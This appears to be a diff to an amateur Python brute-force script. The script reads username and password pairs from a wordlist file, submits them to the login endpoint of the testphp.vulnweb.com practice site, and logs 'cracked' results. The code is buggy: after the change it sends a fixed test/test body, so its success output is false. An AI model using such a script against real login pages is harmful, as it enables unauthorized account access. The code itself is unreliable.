@@ -1,9 +1,9 @@
 #!/usr/bin/python3
-import requests,re
-import httplib2
-from requests.exceptions import ConnectionError
+
 import time
 from http import HTTPStatus
+from urllib import request, parse
+import json
 print('''
   _       _           _   _  ___        
  (_)     (_)         | | (_)/ _ \       
@@ -35,10 +35,14 @@ def check_internet():
         print("NO Connection")
     return False
 
-if(check_internet() == True):
-  break
+
 
 def SendPayload():
+  # Data dict
+  data = { 'uname': 'test', 'pass': 'test' }
+  data = json.dumps(data)
+  data = str(data)
+  data = data.encode('utf-8')
   filepath = 'sifre.txt'
   with open(filepath) as fp:
     line = fp.readline()
@@ -55,14 +59,16 @@ def SendPayload():
        line = fp.readline()
        cnt += 1
   payload = {'uname':username, 'pass':password}
-  r = requests.get("http://testphp.vulnweb.com/userinfo.php", params=payload)
-  print(r)
+  url = "http://testphp.vulnweb.com/userinfo.php"
+  r = request.Request(url,data=data)
+  resp = request.urlopen(r)
+  print(resp)
   print("Trying =>", username , " : " , password)
-  print("Cracked", out)
+  print("Cracked", payload)
   outz = open("cracked.txt", "w")
-  outz.write(str(out))
+  outz.write(str(payload))
   outz.close()
-  return out.append(r.text)
+  return resp
 
 
 SendPayload()
